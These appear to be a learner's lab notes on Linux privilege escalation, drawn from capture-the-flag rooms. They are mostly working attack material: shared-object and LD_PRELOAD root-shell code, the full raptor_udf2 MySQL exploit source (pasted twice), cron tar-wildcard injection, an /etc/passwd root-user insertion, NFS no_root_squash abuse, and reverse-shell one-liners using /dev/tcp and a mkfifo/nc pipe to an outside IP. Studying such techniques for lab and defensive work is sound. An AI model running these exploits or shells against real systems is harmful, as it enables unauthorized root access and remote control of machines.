Privilege Escillation

10/11/2020 21:12

tip: if you find any script running as cron job and that is attached to a script then you can 

copy the bash to tmp/bash
then 
set suid bit chmod 4755 /tmp/bash to get it executed by user we are and that script in which we will do it should be run by root
refrence: [Startup-THM](https://tryhackme.com/room/startup)


tip2: also if any script running as root then do cat root/root.txt > /tmp/flag then boom

14/11/2020 03:16

There are two main privilege escalation variants:

**Horizontal privilege escalation:** This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. For instance, a normal user hijacking another normal user (rather than elevating to super user). This allows you to inherit whatever files and access that user has. This can be used, for example, to gain access to another normal privilege user, that happens to have an SUID file attached to their home directory (more on these later) which can then be used to get super user access. [Travel sideways on the tree]

**Vertical privilege escalation (privilege elevation):** This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised. For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges. [Travel up on the tree]


# Common PrivEsc Linux

**LinuEnum:** This is broken down into few important parts.
* **Kernel** To check if there is any kernel exploit available. (**dirtycow** - 2.6.32-5-amd64)
* **Read/write sesitive files** Check if you are able to read and write on files which you should not have access to. `openssl passwd 123` to generate hash
* **SUID files** (Set owner User ID up on execution) is a special type of file permission that is given to a file. It allows the file to run with permissions of whoever the owner is. If this is root, it runs with root permissions. It can allow us to escalate privileges.
* **Crontab Contents** The scheduled cron jobs are shown below. Cron is used to schedule commands at a specific time. These scheduled commands or tasks are known as "cron jobs". Related to this is the crontab command which creates a crontab file containing and instructions for the cron daemon to execute. There is certainly enough information to warrent attempting to exploit Cronjobs here.

# SUID binary 

4 - SUID bit set to the user(owner)
2 - SGID bit


prepend 4 or 2 like 755 -> 4755 this means uses will also be execute that binary 

Run strace or strings on SUID to identify if they are dependent on libraries
### Finding SUID binaries
`find / -perm -u=s -type f 2>/dev/null`
or
`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

>Note: If you encounter permission denied error then try to give permission with current user +x
### Known exploits of SUID binary 
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign

*As you can see `exim-4.48.3` is a suid having a service specified so we will search for the exploit and boom*

### Shared Object Injection
Hunt: `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
Output:
open("/lib/libc.so.6", O_RDONLY)        = 3
open("==/home/user/.config/libcalc.so==", O_RDONLY) = -1 ENOENT (No such file or directory)

*So we can see that libcalc.so cannt found so we will make it and then obtain shell*
1. Make libcalc.c
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}

```
or 
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
1. Execute ==gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c==
2. Now again execute suid-so.

### Environment Variables
Hunt: ``strings /usr/local/bin/suid-env``
Output:
```
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```
One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

1. Make shell executable service from service.c and same code: `gcc -o service /home/user/tools/suid/service.c`
2. Set the PATH again `PATH=.:$PATH /usr/local/bin/suid-env `
3. Boom

1. Make a shell `echo /bin/bash > uname`
2. Give executable permissions `chmod +x uname`
3. run the SUID binary.


#### Difference between Export PATH= and PATH=
#todo 

**Exports** sets environment for child process of current instance ,but
**$PATH** is already set for the current environment not for its child process also 

So during privesc its better to use **export**


### Abusing shell features 1

In Bash versions **<4.2-048** it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
Example: `function /usr/sbin/service { /bin/bash -p; }`
Hunt: 
1. check for bash version
2. check vuln binary `strings /usr/local/bin/suid-env2`
Output:
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start

3. execute 
```
function /usr/sbin/service { /bin/bash -p; }  
export -f /usr/sbin/service
```
4. Exploit: 
```
function /usr/sbin/service { /bin/bash -p; }  
export -f /usr/sbin/service
```
-f = for exporting functions

### Abusing shell features 2
In some shells (notably bash < 4.2-048 ) it is possible to define user functions with an absolute path name.
these functions can be exported so that subprocess have access to them, and the fucntions can take precendence over the actual executable being called.

Create a function:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```
Export the Function:
```bash
export -f /usr/sbin/service
```
Exploit:
```bash
/usr/local/bin/suid-env2
```


### Privesc for Symlinks (TCM)

## Writable /etc/passwd

first we need to create password 
`openssl passwd -1 -salt [salt] [password]`
ex:
openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1

then add 
`new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash` to the passwd file from the user which have write permissions

or use
`find / -not -type 1 -perm -o+w 2>/dev/null`

## GTFObins
`NOPASSWD: /usr/bin/vi` 

so for this as mentiond on this website 

sudo vi
:!sh
id

finish

# Crontab

`crontab -l` this will list the cron jobs for the current user
`cat /etc/crontab` this will list all the cronjobs available in system

**Netcat** `bash -i >& /dev/tcp/[IP]/[PORT] 0>&1`

### File Permissions
Poor file permission as if we have access to write the file specified in the crontab then we can get the shell.

#### Find World writable files
```bash
find / -user root -perm -002 -type f -not -path "/proc/*"  2>/dev/null
```


### PATH var exploitation
For this one in crontab if the absolute path is not given of the file to be execute ex: 
`* * * * * root overwrite.sh`
so we can create overwrite.sh in home dir and re set the PATH var to home by which now cron will execute our overwrite.sh

***Crontab has PATH variable set so you cant overwrite it anyhow. So if there is any relative path then you hae to check the corntab PATH specified directories for shell placement***
```bash
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```
```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```
*x.sh*

write the code in /home/usr and then we can go ahead


### Wildcards
When a wildcard `(*)` is provided to a command as part of an argument, the shell will first perform filename expansion 
This replaces the wildcard with a space-seperated list 	of the file and dir names in the current dir.
- If you see `/bin/sh -c cd /home/tony && tar -zcf /var/backups/tony.tgz \*` wildcard like this then go for the [Tar cron 2 root](https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e)
[Lab for tar wildcard escalation](https://attackdefense.com/challengedetails?cid=74)
[tryhackme box](https://tryhackme.com/room/linuxprivesc)

**Exploiotation**
1. Make a malicious executable.
	`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
2. `touch /home/user/--checkpoint=1`
3. `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`
4. Now run this **only** `/tmp/bash -p`.
 
***Note:*** We dont need to specify the path because of the crontab already decided the path of the directory where it will look for as /home/user is defined so this is where we making our file.

### Schedule Tasks
1. Use `linpeas.sh` to check if something is in the cron or any other.
2. Use `pspy` to check the runtime processes.
![](https://i.imgur.com/zVAVFsV.png)

# PATH variable exploitation

Its a environment variable that specifies the dirs that holds executable programs. When the user runs any command in terminal, it searches for executable files with the help of the PATH var.

*PATH env variable works from left to right i.e it searches for the binaries from left to right in the directories specified in PATH*

`echo $PATH`
so make a executable file in `/tmp` then 

`PATH=/tmp:$PATH`

then whenever you execute ls which was your custom bin made in tmp will be execute other than real ls hence will be executing our real exploit.

# Sudo privilege escalation
#### Other methods of sudo 
- sudo -i
- sudo -s
- sudo passwd
- sudo /bin/bash

#### (LD_PRELOAD)
It is an environment variable which can be set to the path of a shared object (.so) file.
When set the shared object is loaded before any others.
By creating custom shared object and creating an init() function, we can execute code as soon as the object is called.


**Detection:**
Linux VM
1. In command type: `sudo -l`
2. From the output if you see the `LD_PRELOAD` environment variable is intact.
#### Explaination
1. Use the code:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
*x.c*

3. In command type:
`gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
4. In command type:
`sudo LD_PRELOAD=/tmp/x.so apache2`
BOOM....!

>If the **env_reset** opriton is set, sudo will run programs in a new, minimal environment
>If the **env_keep** option is set, sudo can be used to keep certain environment variables from the user's environment.

**When it wont work?**
When the real user ID is different from the effective user ID.
sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option.

#### LD_LIBRARY_PATH
This is the environment variable contains a set of directories where shared librabires are searched for first.
The **ldd** command can be used to print the shared libraries used by a program.
`ldd /usr/sbin/apache2`

As in PATH escalation we can create the file with the same name and set the LD_LIBRARY_PATH to malicious file ka path just like we do in PATH setting escalation  of absent absolute path.

*shell code x.c*
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Compile: `gcc -o libcrypt.so.1 -shared -fPIC x.c`
Set variable being in the same directory: `sudo LD_LIBRARY_PATH=. apache2`
BOOM!!
 
# Path Escalation
Real scenario in laboratory.htb
Found a vulnerable `docker-security` binary to path privilage escalation.
So i ltraced the application for the calls:
![](https://i.imgur.com/fI3if3X.png)
So as we can see this application calling chmod to get some permissions so this is the vulnerablility 
we will forge a new binary of chmod and then change the paths
![](https://i.imgur.com/jYctnis.png)

so here i come in tmp dir and then i made the chmod binary and then set the new path


*****

![](https://i.imgur.com/GzRCSPr.png)
_**Previous path**_
![](https://i.imgur.com/yuFQamn.png)
_**New path**_




# Stored passwords and shared servers
Use the `grep -nr "db_user" .` to get juicy passwords.

# Restricted Shell
#### rbash
If you are in rbash then [this](https://attackdefense.com/challengedetails?cid=97) will help.

https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf

#### chroot jail
```
#inlcude<stdlib.h>
#include<sys/stat.h>
#include <unistd.h>
int main(void){
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i< 1000; i++)
{
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```

# Services running on server
`ps aux | grep "^root"` gives you the running services as root
then
`service --version` will give the version of service so that we can find the exploit.

**Never run mysql service as a root:**
[Mysql service as a root UDF Exploitation](https://dillidba.blogspot.com/2016/01/get-root-shell-access-using-mysql-with.html)
[UDF Exploit](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)
```c
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
	unsigned int		arg_count;	// number of arguments
	enum Item_result	*arg_type;	// pointer to item_result
	char 			**args;		// pointer to arguments
	unsigned long		*lengths;	// length of string args
	char			*maybe_null;	// 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
	char			maybe_null;	// 1 if func can return NULL
	unsigned int		decimals;	// for real functions
	unsigned long 		max_length;	// for string functions
	char			*ptr;		// free ptr for func data
	char			const_item;	// 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
	if (args->arg_count != 1)
		return(0);

	system(args->args[0]);

	return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
	return(0);
}

// milw0rm.com [2006-02-20]user@debian:~/tools/mysql-udf$ 
user@debian:~/tools/mysql-udf$ 
user@debian:~/tools/mysql-udf$ cat raptor_udf2.c 
/*
 * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $
 *
 * raptor_udf2.c - dynamic library for do_system() MySQL UDF
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This is an helper dynamic library for local privilege escalation through
 * MySQL run with root privileges (very bad idea!), slightly modified to work 
 * with newer versions of the open-source database. Tested on MySQL 4.1.14.
 *
 * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c
 *
 * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes
 * for the security vulnerabilities in the handling of User Defined Functions
 * (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further
 * details, please refer to:
 *
 * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html
 * http://www.wisec.it/vulns.php?page=4
 * http://www.wisec.it/vulns.php?page=5
 * http://www.wisec.it/vulns.php?page=6
 *
 * "UDFs should have at least one symbol defined in addition to the xxx symbol 
 * that corresponds to the main xxx() function. These auxiliary symbols 
 * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and 
 * xxx_add() functions". -- User Defined Functions Security Precautions 
 *
 * Usage:
 * $ id
 * uid=500(raptor) gid=500(raptor) groups=500(raptor)
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> \! sh
 * sh-2.05b$ cat /tmp/out
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
 * [...]
 *
 * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys
 *
 */

#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
	unsigned int		arg_count;	// number of arguments
	enum Item_result	*arg_type;	// pointer to item_result
	char 			**args;		// pointer to arguments
	unsigned long		*lengths;	// length of string args
	char			*maybe_null;	// 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
	char			maybe_null;	// 1 if func can return NULL
	unsigned int		decimals;	// for real functions
	unsigned long 		max_length;	// for string functions
	char			*ptr;		// free ptr for func data
	char			const_item;	// 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
	if (args->arg_count != 1)
		return(0);

	system(args->args[0]);

	return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
	return(0);
}

// milw0rm.com [2006-02-20]
```
*raptor_udf2.c*

Commands:
```bash
gcc -g -c raptor_udf2.c -fPIC  
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc  
```
Connect to the MySQL service as the root user with a blank password:

`mysql -u root`

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

```bash
use mysql;  
create table foo(line blob);  
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));  
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permissions.

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

BOOM!!


# NFS
It is configured in /etc/exports file. Remote users can mount shared, access, create and modify files.
By default created files inherits the remote user's id and group id even if they dont exist on the NFS server


Hunt: check for `cat /etc/exports`

Files created vua NFS inherits the remote user's ID, If the user is root, and root squashing is enabled, the ID will instead be set to 'nobody' user.

Check for NFS share configuration on the debian VM

`cat /etc/exports` | `showmount -e <IP>` | `nmap -sV -script=nfs-showmount <IP>` 
**Mount an NFS share**
`mount -o rw,vers=2 <target>:<share> <local_directory>`


### Root squashing
Root squashing is how NFS prevents an obvious privesc
If the remote user is root, NFS will instead "squash" the user and treat them as if they are the "nobody" user, in the "nobody" group.
While this behaviour is dfalut, it can be disabled.

**no_root_squash** is an NFS config option which turns off root squashing.

When included in a writable share configuration, a remote user who identifies as 'root' can create files on the NFS share as the local root user.

*exports file content*
```bash
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)

```

As you can see here the rw and no_squash option is enabled so we can write file on it as a root user.

Command: `showmount -e `
```bash
Export list for 10.10.28.252:
/tmp *
```
*output*

**Create a directory for the mount point for this and mount:**
```bash
mkdir /tmp/nfs
sudo mount -o rw,vers=2 <IP>:/tmp /tmp/nfs
```

Create a paylod by which executing we can get the shell in the same tty
`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
or 
`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`
 then compile and set the suid bit.

**set the permisson of executing a normal user**`chmod +xs shell.elf`
BOOM!!



# Priv esc tip
1. If you are on other network and looking for shell then open new terminal login in same network and then listen for the priv escalated shell
2. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/home/tony/nc 172.17.0.3 1337 >/tmp/f` always works even in cronjobs if you get the chance to exploit then use this one.
3. If you get 127.0.0.1:1234 running then also by tunneling try `nc` and browser


# Ret2libc
- An attack technique that relies on overwriting the program stack to create a new stack frame that calls the system function
- Stands for "return to library call".


# Python Privilege Escalation 

THM Wonderland:
Google Search:
```bash
# python random privilege escalation

# Check path
python -c 'import sys; print(sys.path)'

# If You see SETENV in sudo -l then go for PYTHONPATH escalation
```

https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7 (Wonderland)
https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/  				
( Wonderland PYTHONPATH )
https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8
https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8
https://rastating.github.io/privilege-escalation-via-python-library-hijacking/


# Strategy 
# Resources for checklist

* https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
* https://payatu.com/guide-linux-privilege-escalation